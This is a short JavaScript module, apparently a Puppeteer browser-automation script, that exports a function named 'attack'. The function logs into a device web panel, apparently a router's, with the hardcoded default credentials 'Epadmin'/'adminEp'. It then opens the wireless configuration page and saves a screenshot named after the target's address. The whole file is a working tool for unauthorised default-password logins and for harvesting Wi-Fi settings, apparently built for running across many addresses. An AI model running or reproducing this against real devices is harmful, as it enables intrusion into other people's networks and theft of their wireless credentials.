const defaultUsername = "Epadmin";
const defaultPassword = "adminEp";

export default async function attack(page, endereco) {

    await (await page.waitForSelector("#txt_Username", {
        timeout: 5000
    })).focus();
    await page.keyboard.type(defaultUsername);

    await (await page.waitForSelector("#txt_Password", {
        timeout: 5000
    })).focus();
    await page.keyboard.type(defaultPassword);

    await page.click("#loginbutton");

    await (await page.waitForSelector("#name_addconfig", {
        timeout: 2000
    })).click();

    await (await page.waitForSelector("#name_wlanconfig", {
        timeout: 2000
    })).click();

    await page.waitForTimeout(4000);
    await page.screenshot({
        path: `./fotos/${endereco}.png`
    });

}